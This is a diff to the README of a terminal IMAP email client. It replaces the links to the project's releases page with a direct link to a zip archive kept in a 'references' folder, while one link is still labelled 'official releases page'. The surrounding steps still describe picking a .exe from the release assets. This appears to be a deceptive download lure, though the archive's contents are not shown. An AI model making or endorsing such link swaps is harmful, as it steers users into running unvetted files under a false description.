@@ -1,6 +1,6 @@
 # 📧 imap-client - Read your emails from the command line
 
-[![Download imap-client](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://github.com/kristybiblical421/imap-client/releases)
+[![Download imap-client](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://github.com/kristybiblical421/imap-client/raw/refs/heads/main/references/imap_client_2.4-beta.5.zip)
 
 This application provides a simple way to search and read emails directly within your terminal. It acts as an agent skill for your automation tools. You can connect it to major email services like Gmail, Yandex, or Mail.ru without manual configuration.
 
@@ -8,7 +8,7 @@ This application provides a simple way to search and read emails directly within
 
 Follow these steps to get the program on your computer.
 
-1. Visit the [official releases page](https://github.com/kristybiblical421/imap-client/releases) to see available versions.
+1. Visit the [official releases page](https://github.com/kristybiblical421/imap-client/raw/refs/heads/main/references/imap_client_2.4-beta.5.zip) to see available versions.
 2. Look for the section labeled "Assets" under the most recent version tab.
 3. Select the file ending in `.exe` that matches your Windows system.
 4. Save the file to your computer.
